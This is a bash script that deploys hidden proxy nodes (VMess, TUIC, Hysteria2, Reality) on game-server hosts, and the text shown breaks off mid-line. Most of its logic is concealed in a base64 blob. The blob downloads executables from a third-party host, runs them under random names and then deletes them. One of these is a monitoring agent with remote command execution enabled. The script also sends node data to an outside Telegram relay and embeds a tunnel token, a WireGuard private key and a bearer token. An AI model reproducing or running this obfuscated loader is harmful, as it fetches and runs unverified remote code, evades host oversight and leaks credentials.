#!/bin/bash  
export UUID=${UUID:-'0ff0350e-c001-495b-a6a1-13b962590375'} # 哪吒v1，在不同的平台需要改UUID，否则会覆盖
export NEZHA_SERVER=${NEZHA_SERVER:-''}       # v1哪吒填写形式：nezha.abc.com:8008,v0哪吒填写形式：nezha.abc.com
export NEZHA_PORT=${NEZHA_PORT:-''}           # v1哪吒不要填写这个,v0哪吒agent端口为{443,8443,2053,2083,2087,2096}其中之一时自动开启tls
export NEZHA_KEY=${NEZHA_KEY:-''}             # v1的NZ_CLIENT_SECRET或v0的agent密钥
export ARGO_DOMAIN=${ARGO_DOMAIN:-'claw.guandyue.ip-ddns.com'}         # 固定隧道域名,留空即启用临时隧道
export ARGO_AUTH=${ARGO_AUTH:-'eyJhIjoiODVhOGVmOTM0NjY5NDAyYjgwYzljNDk0NTA5Mjg4YWUiLCJ0IjoiZjdhNzM0NDUtZjJjNy00Y2RjLWJiZmYtYTUyMTdkM2M2ZjhlIiwicyI6IllXUTBOV0UwWm1NdFpHVmpaaTAwT1RJekxXSTNPVGt0TnpVMU1qaGpPR015TlRReiJ9'}             # 固定隧道token或json,留空即启用临时隧道
export CFIP=${CFIP:-'www.epicgames.com'}        # argo节点优选域名或优选ip
export CFPORT=${CFPORT:-'443'}                # argo节点端口 
export NAME=${NAME:-'Vls'}                    # 节点名称  
export FILE_PATH=${FILE_PATH:-'./world'}      # sub 路径  
export ARGO_PORT=${ARGO_PORT:-'8001'}         # argo端口 使用固定隧道token,cloudflare后台设置的端口需和这里对应
export TUIC_PORT=${TUIC_PORT:-'40000'}        # Tuic 端口，支持多端口玩具可填写，否则不动
export HY2_PORT=${HY2_PORT:-'443'}          # Hy2 端口，支持多端口玩具可填写，否则不动
export REALITY_PORT=${REALITY_PORT:-'60000'}  # reality 端口,支持多端口玩具可填写，否则不动  
export GAME_FILE=${GAME_FILE:-'LICENSE.jar'}  # 填写游戏文件名，不填写不启动游戏，无法运行
export CHAT_ID=${CHAT_ID:-''}                 # TG chat_id，可在https://t.me/laowang_serv00_bot 获取
export BOT_TOKEN=${BOT_TOKEN:-''}             # TG bot_token, 使用自己的bot需要填写,使用上方的bot不用填写,不会给别人发送
export UPLOAD_URL=${UPLOAD_URL:-''}  # 订阅自动上传地址,没有可不填,需要填部署Merge-sub项目后的首页地址,例如：https://merge.serv00.net

echo "ZGVsZXRlX29sZF9ub2RlcygpIHsKICBbWyAteiAkVVBMT0FEX1VSTCB8fCAhIC1mICIke0ZJTEVfUEFUSH0vc3ViLnR4dCIgXV0gJiYgcmV0dXJuCiAgb2xkX25vZGVzPSQoYmFzZTY0IC1kICIke0ZJTEVfUEFUSH0vc3ViLnR4dCIgfCBncmVwIC1FICcodmxlc3N8dm1lc3N8dHJvamFufGh5c3RlcmlhMnx0dWljKTovLycpCiAgW1sgLXogJG9sZF9ub2RlcyBdXSAmJiByZXR1cm4KCiAganNvbl9kYXRhPSd7Im5vZGVzIjogWycKICBmb3Igbm9kZSBpbiAkb2xkX25vZGVzOyBkbwogICAgICBqc29uX2RhdGErPSJcIiRub2RlXCIsIgogIGRvbmUKICBqc29uX2RhdGE9JHtqc29uX2RhdGElLH0gIAogIGpzb25fZGF0YSs9J119JwoKICBjdXJsIC1YIERFTEVURSAiJFVQTE9BRF9VUkwvYXBpL2RlbGV0ZS1ub2RlcyIgXAogICAgICAgIC1IICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24iIFwKICAgICAgICAtZCAiJGpzb25fZGF0YSIgPiAvZGV2L251bGwgMj4mMQp9CmRlbGV0ZV9vbGRfbm9kZXMKClsgISAtZCAiJHtGSUxFX1BBVEh9IiBdICYmIG1rZGlyIC1wICIke0ZJTEVfUEFUSH0iICYmIHJtIC1yZiBib290LmxvZyBjb25maWcuanNvbiB0dW5uZWwuanNvbiB0dW5uZWwueW1sICIke0ZJTEVfUEFUSH0vc3ViLnR4dCIgPi9kZXYvbnVsbCAyPiYxCgoKYXJnb19jb25maWd1cmUoKSB7CiAgaWYgW1sgLXogJEFSR09fQVVUSCB8fCAteiAkQVJHT19ET01BSU4gXV07IHRoZW4KICAgIGVjaG8gLWUgIlxlWzE7MzJtQVJHT19ET01BSU4gb3IgQVJHT19BVVRIIHZhcmlhYmxlIGlzIGVtcHR5LCB1c2UgcXVpY2sgdHVubmVsc1xlWzBtIiAgIAogICAgcmV0dXJuCiAgZmkKCiAgaWYgW1sgJEFSR09fQVVUSCA9fiBUdW5uZWxTZWNyZXQgXV07IHRoZW4KICAgIGVjaG8gJEFSR09fQVVUSCA+IHR1bm5lbC5qc29uCiAgICBjYXQgPiB0dW5uZWwueW1sIDw8IEVPRgp0dW5uZWw6ICQoY3V0IC1kXCIgLWYxMiA8PDwgIiRBUkdPX0FVVEgiKQpjcmVkZW50aWFscy1maWxlOiB0dW5uZWwuanNvbgpwcm90b2NvbDogaHR0cDIKCmluZ3Jlc3M6CiAgLSBob3N0bmFtZTogJEFSR09fRE9NQUlOCiAgICBzZXJ2aWNlOiBodHRwOi8vbG9jYWxob3N0OiRBUkdPX1BPUlQKICAgIG9yaWdpblJlcXVlc3Q6CiAgICAgIG5vVExTVmVyaWZ5OiB0cnVlCiAgLSBzZXJ2aWNlOiBodHRwX3N0YXR1czo0MDQKRU9GCiAgZWxzZQogICAgZWNobyAtZSAiXGVbMTszMm1BUkdPX0FVVEggbWlzbWF0Y2ggVHVubmVsU2VjcmV0LHVzZSB0b2tlbiBjb25uZWN0IHRvIHR1bm5lbFxlWzBtIgogIGZpCn0KYXJnb19jb25maWd1cmUKd2FpdAoKZG93bmxvYWRfYW5kX3J1bigpIHsKQVJDSD0kKHVuYW1lIC1tKSAmJiBET1dOTE9BRF9ESVI9Ii4iICYmIG1rZGlyIC1wICIkRE9XTkxPQURfRElSIiAmJiBGSUxFX0lORk89KCkKaWYgWyAiJEFSQ0giID09ICJhcm0iIF0gfHwgWyAiJEFSQ0giID09ICJhcm02NCIgXSB8fCBbICIkQVJDSCIgPT0gImFhcmNoNjQiIF07IHRoZW4KICAgIEJBU0VfVVJMPSJodHRwczovL2FybTY0LnNzc3MubnljLm1uIgplbGlmIFsgIiRBUkNIIiA9PSAiYW1kNjQiIF0gfHwgWyAiJEFSQ0giID09ICJ4ODZfNjQiIF0gfHwgWyAiJEFSQ0giID09ICJ4ODYiIF07IHRoZW4KICAgIEJBU0VfVVJMPSJodHRwczovL2FtZDY0LnNzc3MubnljLm1uIgplbHNlCiAgICBlY2hvICJVbnN1cHBvcnRlZCBhcmNoaXRlY3R1cmU6ICRBUkNIIgogICAgZXhpdCAxCmZpCkZJTEVfSU5GTz0oIiRCQVNFX1VSTC9zYiB3ZWIiICIkQkFTRV9VUkwvYm90IGJvdCIpCgppZiBbIC1uICIkTkVaSEFfUE9SVCIgXTsgdGhlbgogICAgRklMRV9JTkZPKz0oIiRCQVNFX1VSTC9hZ2VudCBucG0iKQplbHNlCiAgICBGSUxFX0lORk8rPSgiJEJBU0VfVVJML3YxIHBocCIpCiAgICBjYXQgPiAiJHtGSUxFX1BBVEh9L2NvbmZpZy55YW1sIiA8PCBFT0YKY2xpZW50X3NlY3JldDogJHtORVpIQV9LRVl9CmRlYnVnOiBmYWxzZQpkaXNhYmxlX2F1dG9fdXBkYXRlOiB0cnVlCmRpc2FibGVfY29tbWFuZF9leGVjdXRlOiBmYWxzZQpkaXNhYmxlX2ZvcmNlX3VwZGF0ZTogdHJ1ZQpkaXNhYmxlX25hdDogZmFsc2UKZGlzYWJsZV9zZW5kX3F1ZXJ5OiBmYWxzZQpncHU6IGZhbHNlCmluc2VjdXJlX3RsczogZmFsc2UKaXBfcmVwb3J0X3BlcmlvZDogMTgwMApyZXBvcnRfZGVsYXk6IDEKc2VydmVyOiAke05FWkhBX1NFUlZFUn0Kc2tpcF9jb25uZWN0aW9uX2NvdW50OiBmYWxzZQpza2lwX3Byb2NzX2NvdW50OiBmYWxzZQp0ZW1wZXJhdHVyZTogZmFsc2UKdGxzOiBmYWxzZQp1c2VfZ2l0ZWVfdG9fdXBncmFkZTogZmFsc2UKdXNlX2lwdjZfY291bnRyeV9jb2RlOiBmYWxzZQp1dWlkOiAke1VVSUR9CkVPRgpmaQpkZWNsYXJlIC1BIEZJTEVfTUFQCmdlbmVyYXRlX3JhbmRvbV9uYW1lKCkgewogICAgbG9jYWwgY2hhcnM9YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY3ODkwCiAgICBsb2NhbCBuYW1lPSIiCiAgICBmb3IgaSBpbiB7MS4uNn07IGRvCiAgICAgICAgbmFtZT0iJG5hbWUke2NoYXJzOlJBTkRPTSUkeyNjaGFyc306MX0iCiAgICBkb25lCiAgICBlY2hvICIkbmFtZSIKfQpkb3dubG9hZF9maWxlKCkgewogICAgbG9jYWwgVVJMPSQxCiAgICBsb2NhbCBORVdfRklMRU5BTUU9JDIKCiAgICBpZiBjb21tYW5kIC12IGN1cmwgPi9kZXYvbnVsbCAyPiYxOyB0aGVuCiAgICAgICAgY3VybCAtTCAtc1MgLW8gIiRORVdfRklMRU5BTUUiICIkVVJMIgogICAgICAgIGVjaG8gLWUgIlxlWzE7MzJtRG93bmxvYWRlZCAkTkVXX0ZJTEVOQU1FIGJ5IGN1cmxcZVswbSIKICAgIGVsaWYgY29tbWFuZCAtdiB3Z2V0ID4vZGV2L251bGwgMj4mMTsgdGhlbgogICAgICAgIHdnZXQgLXEgLU8gIiRORVdfRklMRU5BTUUiICIkVVJMIgogICAgICAgIGVjaG8gLWUgIlxlWzE7MzJtRG93bmxvYWRlZCAkTkVXX0ZJTEVOQU1FIGJ5IHdnZXRcZVswbSIKICAgIGVsc2UKICAgICAgICBlY2hvIC1lICJcZVsxOzMzbU5laXRoZXIgY3VybCBub3Igd2dldCBpcyBhdmFpbGFibGUgZm9yIGRvd25sb2FkaW5nXGVbMG0iCiAgICAgICAgZXhpdCAxCiAgICBmaQp9CmZvciBlbnRyeSBpbiAiJHtGSUxFX0lORk9bQF19IjsgZG8KICAgIFVSTD0kKGVjaG8gIiRlbnRyeSIgfCBjdXQgLWQgJyAnIC1mIDEpCiAgICBSQU5ET01fTkFNRT0kKGdlbmVyYXRlX3JhbmRvbV9uYW1lKQogICAgTkVXX0ZJTEVOQU1FPSIkRE9XTkxPQURfRElSLyRSQU5ET01fTkFNRSIKICAgIAogICAgZG93bmxvYWRfZmlsZSAiJFVSTCIgIiRORVdfRklMRU5BTUUiCiAgICAKICAgIGNobW9kICt4ICIkTkVXX0ZJTEVOQU1FIgogICAgRklMRV9NQVBbJChlY2hvICIkZW50cnkiIHwgY3V0IC1kICcgJyAtZiAyKV09IiRORVdfRklMRU5BTUUiCmRvbmUKd2FpdAoKb3V0cHV0PSQoLi8iJChiYXNlbmFtZSAke0ZJTEVfTUFQW3dlYl19KSIgZ2VuZXJhdGUgcmVhbGl0eS1rZXlwYWlyKQpwcml2YXRlX2tleT0kKGVjaG8gIiR7b3V0cHV0fSIgfCBhd2sgJy9Qcml2YXRlS2V5Oi8ge3ByaW50ICQyfScpCnB1YmxpY19rZXk9JChlY2hvICIke291dHB1dH0iIHwgYXdrICcvUHVibGljS2V5Oi8ge3ByaW50ICQyfScpCgpvcGVuc3NsIGVjcGFyYW0gLWdlbmtleSAtbmFtZSBwcmltZTI1NnYxIC1vdXQgInByaXZhdGUua2V5IgpvcGVuc3NsIHJlcSAtbmV3IC14NTA5IC1kYXlzIDM2NTAgLWtleSAicHJpdmF0ZS5rZXkiIC1vdXQgImNlcnQucGVtIiAtc3ViaiAiL0NOPWJpbmcuY29tIgoKICBjYXQgPiBjb25maWcuanNvbiA8PCBFT0YKewogICAgImxvZyI6IHsKICAgICAgICAiZGlzYWJsZWQiOiB0cnVlLAogICAgICAgICJsZXZlbCI6ICJpbmZvIiwKICAgICAgICAidGltZXN0YW1wIjogdHJ1ZQogICAgfSwKICAgICJkbnMiOiB7CiAgICAgICAgInNlcnZlcnMiOiBbCiAgICAgICAgewogICAgICAgICAgInRhZyI6ICJnb29nbGUiLAogICAgICAgICAgImFkZHJlc3MiOiAidGxzOi8vOC44LjguOCIKICAgICAgICB9CiAgICAgIF0KICAgIH0sCiAgICAiaW5ib3VuZHMiOiBbCiAgICB7CiAgICAgICJ0YWciOiAidm1lc3Mtd3MtaW4iLAogICAgICAidHlwZSI6ICJ2bWVzcyIsCiAgICAgICJsaXN0ZW4iOiAiOjoiLAogICAgICAibGlzdGVuX3BvcnQiOiAke0FSR09fUE9SVH0sCiAgICAgICAgInVzZXJzIjogWwogICAgICAgIHsKICAgICAgICAgICJ1dWlkIjogIiR7VVVJRH0iCiAgICAgICAgfQogICAgICBdLAogICAgICAidHJhbnNwb3J0IjogewogICAgICAgICJ0eXBlIjogIndzIiwKICAgICAgICAicGF0aCI6ICIvdm1lc3MtYXJnbyIsCiAgICAgICAgImVhcmx5X2RhdGFfaGVhZGVyX25hbWUiOiAiU2VjLVdlYlNvY2tldC1Qcm90b2NvbCIKICAgICAgfQogICAgfSwKICAgIHsKICAgICAgInRhZyI6ICJ0dWljLWluIiwKICAgICAgInR5cGUiOiAidHVpYyIsCiAgICAgICJsaXN0ZW4iOiAiOjoiLAogICAgICAibGlzdGVuX3BvcnQiOiAke1RVSUNfUE9SVH0sCiAgICAgICJ1c2VycyI6IFsKICAgICAgICB7CiAgICAgICAgICAidXVpZCI6ICIke1VVSUR9IiwKICAgICAgICAgICJwYXNzd29yZCI6ICJhZG1pbiIKICAgICAgICB9CiAgICAgIF0sCiAgICAgICJjb25nZXN0aW9uX2NvbnRyb2wiOiAiYmJyIiwKICAgICAgInRscyI6IHsKICAgICAgICAiZW5hYmxlZCI6IHRydWUsCiAgICAgICAgImFscG4iOiBbCiAgICAgICAgICAiaDMiCiAgICAgICAgXSwKICAgICAgICAiY2VydGlmaWNhdGVfcGF0aCI6ICJjZXJ0LnBlbSIsCiAgICAgICAgImtleV9wYXRoIjogInByaXZhdGUua2V5IgogICAgICB9CiAgICB9LAogICAgewogICAgICAidGFnIjogImh5c3RlcmlhMi1pbiIsCiAgICAgICJ0eXBlIjogImh5c3RlcmlhMiIsCiAgICAgICJsaXN0ZW4iOiAiOjoiLAogICAgICAibGlzdGVuX3BvcnQiOiAke0hZMl9QT1JUfSwKICAgICAgICAidXNlcnMiOiBbCiAgICAgICAgICB7CiAgICAgICAgICAgICAicGFzc3dvcmQiOiAiJHtVVUlEfSIKICAgICAgICAgIH0KICAgICAgXSwKICAgICAgIm1hc3F1ZXJhZGUiOiAiaHR0cHM6Ly9iaW5nLmNvbSIsCiAgICAgICAgInRscyI6IHsKICAgICAgICAgICAgImVuYWJsZWQiOiB0cnVlLAogICAgICAgICAgICAiYWxwbiI6IFsKICAgICAgICAgICAgICAgICJoMyIKICAgICAgICAgICAgXSwKICAgICAgICAgICAgImNlcnRpZmljYXRlX3BhdGgiOiAiY2VydC5wZW0iLAogICAgICAgICAgICAia2V5X3BhdGgiOiAicHJpdmF0ZS5rZXkiCiAgICAgICAgICB9CiAgICAgIH0sCiAgICAgIHsKICAgICAgICAidGFnIjogInZsZXNzLXJlYWxpdHktdmVzaW9uIiwKICAgICAgICAidHlwZSI6ICJ2bGVzcyIsCiAgICAgICAgImxpc3RlbiI6ICI6OiIsCiAgICAgICAgImxpc3Rlbl9wb3J0IjogJFJFQUxJVFlfUE9SVCwKICAgICAgICAgICJ1c2VycyI6IFsKICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAidXVpZCI6ICIkVVVJRCIsCiAgICAgICAgICAgICAgICAiZmxvdyI6ICJ4dGxzLXJwcngtdmlzaW9uIgogICAgICAgICAgICAgIH0KICAgICAgICAgIF0sCiAgICAgICAgICAidGxzIjogewogICAgICAgICAgICAgICJlbmFibGVkIjogdHJ1ZSwKICAgICAgICAgICAgICAic2VydmVyX25hbWUiOiAid3d3Lm5hemh1bWkuY29tIiwKICAgICAgICAgICAgICAicmVhbGl0eSI6IHsKICAgICAgICAgICAgICAgICAgImVuYWJsZWQiOiB0cnVlLAogICAgICAgICAgICAgICAgICAiaGFuZHNoYWtlIjogewogICAgICAgICAgICAgICAgICAgICAgInNlcnZlciI6ICJ3d3cubmF6aHVtaS5jb20iLAogICAgICAgICAgICAgICAgICAgICAgInNlcnZlcl9wb3J0IjogNDQzCiAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICJwcml2YXRlX2tleSI6ICIkcHJpdmF0ZV9rZXkiLAogICAgICAgICAgICAgICAgICAic2hvcnRfaWQiOiBbCiAgICAgICAgICAgICAgICAgICAgIiIKICAgICAgICAgICAgICAgICAgXQogICAgICAgICAgICAgIH0KICAgICAgICAgIH0KICAgICAgfQogICBdLAogICJvdXRib3VuZHMiOiBbCiAgICB7CiAgICAgICJ0eXBlIjogImRpcmVjdCIsCiAgICAgICJ0YWciOiAiZGlyZWN0IgogICAgfSwKICAgIHsKICAgICAgInR5cGUiOiAiYmxvY2siLAogICAgICAidGFnIjogImJsb2NrIgogICAgfSwKICAgIHsKICAgICAgInR5cGUiOiAid2lyZWd1YXJkIiwKICAgICAgInRhZyI6ICJ3aXJlZ3VhcmQtb3V0IiwKICAgICAgInNlcnZlciI6ICIxNjIuMTU5LjE5Mi4yMDAiLAogICAgICAic2VydmVyX3BvcnQiOiA0NTAwLAogICAgICAibG9jYWxfYWRkcmVzcyI6IFsKICAgICAgICAiMTcyLjE2LjAuMi8zMiIsCiAgICAgICAgIjI2MDY6NDcwMDoxMTA6OGY3NzoxY2E5OmYwODY6ODQ2Yzo1ZjllLzEyOCIKICAgICAgXSwKICAgICAgInByaXZhdGVfa2V5IjogIndJeHN6ZFIybk1kQTdhMlVsM1hRY25pU2ZTWnFkcWpQYjZ3Nm9wdmY1QVU9IiwKICAgICAgInBlZXJfcHVibGljX2tleSI6ICJibVhPQytGMUZ4RU1GOWR5aUsySDUvMVNVdHpIMEp1Vm81MWgyd1BmZ3lvPSIsCiAgICAgICJyZXNlcnZlZCI6IFsxMjYsIDI0NiwgMTczXQogICAgfQogIF0sCiAgInJvdXRlIjogewogICAgInJ1bGVfc2V0IjogWwogICAgICB7CiAgICAgICAgInRhZyI6ICJuZXRmbGl4IiwKICAgICAgICAidHlwZSI6ICJyZW1vdGUiLAogICAgICAgICJmb3JtYXQiOiAiYmluYXJ5IiwKICAgICAgICAidXJsIjogImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9NZXRhQ3ViZVgvbWV0YS1ydWxlcy1kYXQvc2luZy9nZW8vZ2Vvc2l0ZS9uZXRmbGl4LnNycyIsCiAgICAgICAgImRvd25sb2FkX2RldG91ciI6ICJkaXJlY3QiCiAgICAgIH0sCiAgICAgIHsKICAgICAgICAidGFnIjogIm9wZW5haSIsCiAgICAgICAgInR5cGUiOiAicmVtb3RlIiwKICAgICAgICAiZm9ybWF0IjogImJpbmFyeSIsCiAgICAgICAgInVybCI6ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vTWV0YUN1YmVYL21ldGEtcnVsZXMtZGF0L3NpbmcvZ2VvL2dlb3NpdGUvb3BlbmFpLnNycyIsCiAgICAgICAgImRvd25sb2FkX2RldG91ciI6ICJkaXJlY3QiCiAgICAgIH0KICAgIF0sCiAgICAicnVsZXMiOiBbCiAgICAgIHsKICAgICAgICAicnVsZV9zZXQiOiBbIm5ldGZsaXgiLCAib3BlbmFpIl0sCiAgICAgICAgIm91dGJvdW5kIjogIndpcmVndWFyZC1vdXQiCiAgICAgIH0KICAgIF0sCiAgICAiZmluYWwiOiAiZGlyZWN0IgogIH0KfQpFT0YKCmlmIFsgLWUgIiQoYmFzZW5hbWUgJHtGSUxFX01BUFt3ZWJdfSkiIF07IHRoZW4KICAgIG5vaHVwIC4vIiQoYmFzZW5hbWUgJHtGSUxFX01BUFt3ZWJdfSkiIHJ1biAtYyBjb25maWcuanNvbiA+L2Rldi9udWxsIDI+JjEgJgogICAgc2xlZXAgMgogICAgZWNobyAtZSAiXGVbMTszMm0kKGJhc2VuYW1lICR7RklMRV9NQVBbd2ViXX0pIGlzIHJ1bm5pbmdcZVswbSIKZmkKCmlmIFsgLWUgIiQoYmFzZW5hbWUgJHtGSUxFX01BUFtib3RdfSkiIF07IHRoZW4KICAgIGlmIFtbICRBUkdPX0FVVEggPX4gXltBLVowLTlhLXo9XXsxMjAsMjUwfSQgXV07IHRoZW4KICAgICAgYXJncz0idHVubmVsIC0tZWRnZS1pcC12ZXJzaW9uIGF1dG8gLS1uby1hdXRvdXBkYXRlIC0tcHJvdG9jb2wgaHR0cDIgcnVuIC0tdG9rZW4gJHtBUkdPX0FVVEh9IgogICAgZWxpZiBbWyAkQVJHT19BVVRIID1+IFR1bm5lbFNlY3JldCBdXTsgdGhlbgogICAgICBhcmdzPSJ0dW5uZWwgLS1lZGdlLWlwLXZlcnNpb24gYXV0byAtLWNvbmZpZyB0dW5uZWwueW1sIHJ1biIKICAgIGVsc2UKICAgICAgYXJncz0idHVubmVsIC0tZWRnZS1pcC12ZXJzaW9uIGF1dG8gLS1uby1hdXRvdXBkYXRlIC0tcHJvdG9jb2wgaHR0cDIgLS1sb2dmaWxlIGJvb3QubG9nIC0tbG9nbGV2ZWwgaW5mbyAtLXVybCBodHRwOi8vbG9jYWxob3N0OiRBUkdPX1BPUlQiCiAgICBmaQogICAgbm9odXAgLi8iJChiYXNlbmFtZSAke0ZJTEVfTUFQW2JvdF19KSIgJGFyZ3MgPi9kZXYvbnVsbCAyPiYxICYKICAgIHNsZWVwIDIKICAgIGVjaG8gLWUgIlxlWzE7MzJtJChiYXNlbmFtZSAke0ZJTEVfTUFQW2JvdF19KSBpcyBydW5uaW5nXGVbMG0iIApmaQoKaWYgWyAtbiAiJE5FWkhBX1NFUlZFUiIgXSAmJiBbIC1uICIkTkVaSEFfUE9SVCIgXSAmJiBbIC1uICIkTkVaSEFfS0VZIiBdOyB0aGVuCiAgICBpZiBbIC1lICIkKGJhc2VuYW1lICR7RklMRV9NQVBbbnBtXX0pIiBdOyB0aGVuCgkgIHRsc1BvcnRzPSgiNDQzIiAiODQ0MyIgIjIwOTYiICIyMDg3IiAiMjA4MyIgIjIwNTMiKQogICAgICBbWyAiJHt0bHNQb3J0c1sqXX0iID1+ICIke05FWkhBX1BPUlR9IiBdXSAmJiBORVpIQV9UTFM9Ii0tdGxzIiB8fCBORVpIQV9UTFM9IiIKICAgICAgZXhwb3J0IFRNUERJUj0kKHB3ZCkKICAgICAgbm9odXAgLi8iJChiYXNlbmFtZSAke0ZJTEVfTUFQW25wbV19KSIgLXMgJHtORVpIQV9TRVJWRVJ9OiR7TkVaSEFfUE9SVH0gLXAgJHtORVpIQV9LRVl9ICR7TkVaSEFfVExTfSA+L2Rldi9udWxsIDI+JjEgJgogICAgICBzbGVlcCAyCiAgICAgIGVjaG8gLWUgIlxlWzE7MzJtJChiYXNlbmFtZSAke0ZJTEVfTUFQW25wbV19KSBpcyBydW5uaW5nXGVbMG0iCiAgICBmaQplbGlmIFsgLW4gIiRORVpIQV9TRVJWRVIiIF0gJiYgWyAtbiAiJE5FWkhBX0tFWSIgXTsgdGhlbgogICAgaWYgWyAtZSAiJChiYXNlbmFtZSAke0ZJTEVfTUFQW3BocF19KSIgXTsgdGhlbgogICAgICBub2h1cCAuLyIkKGJhc2VuYW1lICR7RklMRV9NQVBbcGhwXX0pIiAtYyAiJHtGSUxFX1BBVEh9L2NvbmZpZy55YW1sIiA+L2Rldi9udWxsIDI+JjEgJgogICAgICBlY2hvIC1lICJcZVsxOzMybSQoYmFzZW5hbWUgJHtGSUxFX01BUFtwaHBdfSkgaXMgcnVubmluZ1xlWzBtIgogICAgZmkKZWxzZQogICAgZWNobyAtZSAiXGVbMTszNW1ORVpIQSB2YXJpYWJsZSBpcyBlbXB0eSwgc2tpcHBpbmcgcnVubmluZ1xlWzBtIgpmaQpmb3Iga2V5IGluICIkeyFGSUxFX01BUFtAXX0iOyBkbwogICAgaWYgWyAtZSAiJChiYXNlbmFtZSAke0ZJTEVfTUFQWyRrZXldfSkiIF07IHRoZW4KICAgICAgICBybSAtcmYgIiQoYmFzZW5hbWUgJHtGSUxFX01BUFska2V5XX0pIiA+L2Rldi9udWxsIDI+JjEKICAgIGZpCmRvbmUKfQpkb3dubG9hZF9hbmRfcnVuCgpnZXRfYXJnb2RvbWFpbigpIHsKICBpZiBbWyAtbiAkQVJHT19BVVRIIF1dOyB0aGVuCiAgICBlY2hvICIkQVJHT19ET01BSU4iCiAgZWxzZQogICAgbG9jYWwgcmV0cnk9MAogICAgbG9jYWwgbWF4X3JldHJpZXM9NgogICAgbG9jYWwgYXJnb2RvbWFpbj0iIgogICAgd2hpbGUgW1sgJHJldHJ5IC1sdCAkbWF4X3JldHJpZXMgXV07IGRvCiAgICAgICgocmV0cnkrKykpCiAgICAgIGFyZ29kb21haW49JChzZWQgLW4gJ3N8LipodHRwczovL1woW14vXSp0cnljbG91ZGZsYXJlXC5jb21cKS4qfFwxfHAnIGJvb3QubG9nKQogICAgICBpZiBbWyAtbiAkYXJnb2RvbWFpbiBdXTsgdGhlbgogICAgICAgIGJyZWFrCiAgICAgIGZpCiAgICAgIHNsZWVwIDEKICAgIGRvbmUKICAgIGVjaG8gIiRhcmdvZG9tYWluIgogIGZpCn0KCnNlbmRfdGVsZWdyYW0oKSB7CiAgWyAtZiAiJHtGSUxFX1BBVEh9L3N1Yi50eHQiIF0gfHwgcmV0dXJuCiAgTUVTU0FHRT0kKGNhdCAiJHtGSUxFX1BBVEh9L3N1Yi50eHQiKQogIExPQ0FMX01FU1NBR0U9IioqKiR7TkFNRX3oioLngrnmjqjpgIHpgJrnn6UqKipcblxgXGBcYCR7TUVTU0FHRX1cYFxgXGAiCiAgaWYgWyAtbiAiJHtCT1RfVE9LRU59IiBdICYmIFsgLW4gIiR7Q0hBVF9JRH0iIF07IHRoZW4KICAgIGN1cmwgLXMgLVggUE9TVCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCR7Qk9UX1RPS0VOfS9zZW5kTWVzc2FnZSIgXAogICAgICAtZCAiY2hhdF9pZD0ke0NIQVRfSUR9JnRleHQ9JHtMT0NBTF9NRVNTQUdFfSZwYXJzZV9tb2RlPU1hcmtkb3duIiA+IC9kZXYvbnVsbAoKICBlbGlmIFsgLW4gIiR7Q0hBVF9JRH0iIF07IHRoZW4KICAgIGN1cmwgLXMgLVggUE9TVCAiaHR0cDovL2FwaS50Zy5ndnJhbmRlci5ldS5vcmcvYXBpL25vdGlmeSIgXAogICAgICAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyIGVKV1JneEM0TGN6bktMaVVpRG9Vc3dAbk1nREJDQ1NVazZJdzBTOVBicyIgXAogICAgICAtSCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uIiBcCiAgICAgIC1kICIkKHByaW50ZiAneyJjaGF0X2lkIjogIiVzIiwgIm1lc3NhZ2UiOiAiJXMifScgIiR7Q0hBVF9JRH0iICIke0xPQ0FMX01FU1NBR0V9IikiID4gL2Rldi9udWxsCiAgZWxzZQogICAgZWNobyAtZSAiXG5cZVsxOzM1bVRHIHZhcmlhYmxlIGlzIGVtcHR5LHNraXBwaW5nIHNlbnRcZVswbSIKICAgIHJldHVybgogIGZpCgogIGlmIFsgJD8gLWVxIDAgXTsgdGhlbgogICAgZWNobyAtZSAiXG5cZVsxOzMybU5vZGVzIHNlbnQgdG8gVEcgc3VjY2Vzc2Z1bGx5XGVbMG0iCiAgZWxzZQogICAgZWNobyAtZSAiXG5cZVsxOzMxbUZhaWxlZCB0byBzZW5kIG5vZGVzIHRvIFRHXGVbMG0iCiAgZmkKfQoKdXBsb2Rfbm9kZXMoKSB7CiAgICBbWyAteiAkVVBMT0FEX1VSTCB8fCAhIC1mICIke0ZJTEVfUEFUSH0vbGlzdC50eHQiIF1dICYmIHJldHVybgogICAgY29udGVudD0kKGNhdCAke0ZJTEVfUEFUSH0vbGlzdC50eHQpCiAgICBub2Rlcz0kKGVjaG8gIiRjb250ZW50IiB8IGdyZXAgLUUgJyh2bGVzc3x2bWVzc3x0cm9qYW58aHlzdGVyaWEyfHR1aWMpOi8vJykKICAgIFtbIC16ICRub2RlcyBdXSAmJiByZXR1cm4KICAgIG5vZGVzPSgkbm9kZXMpCiAgICBqc29uX2RhdGE9J3sibm9kZXMiOiBbJwogICAgZm9yIG5vZGUgaW4gIiR7bm9kZXNbQF19IjsgZG8KICAgICAgICBqc29uX2RhdGErPSJcIiRub2RlXCIsIgogICAgZG9uZQogICAganNvbl9kYXRhPSR7anNvbl9kYXRhJSx9CiAgICBqc29uX2RhdGErPSddfScKCiAgICBjdXJsIC1YIFBPU1QgIiRVUExPQURfVVJML2FwaS9hZGQtbm9kZXMiIFwKICAgICAgICAgLUggIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbiIgXAogICAgICAgICAtZCAiJGpzb25fZGF0YSIgPiAvZGV2L251bGwgMj4mMQoKICAgIGlmIFtbICQ/IC1lcSAwIF1dOyB0aGVuCiAgICAgICAgZWNobyAtZSAiXDAzM1sxOzMybU5vZGVzIHVwbG9hZGVkIHN1Y2Nlc3NmdWxseVwwMzNbMG0iCiAgICBlbHNlCiAgICAgICAgZWNobyAtZSAiXDAzM1sxOzMxbUZhaWxlZCB0byB1cGxvYWQgbm9kZXNcMDMzWzBtIgogICAgZmkKfQoKYXJnb2RvbWFpbj0kKGdldF9hcmdvZG9tYWluKQplY2hvIC1lICJcZVsxOzMybUFyZ29Eb21haW46XGVbMTszNW0ke2FyZ29kb21haW59XGVbMG1cbiIKc2xlZXAgMQpJUD0kKGN1cmwgLXMgLS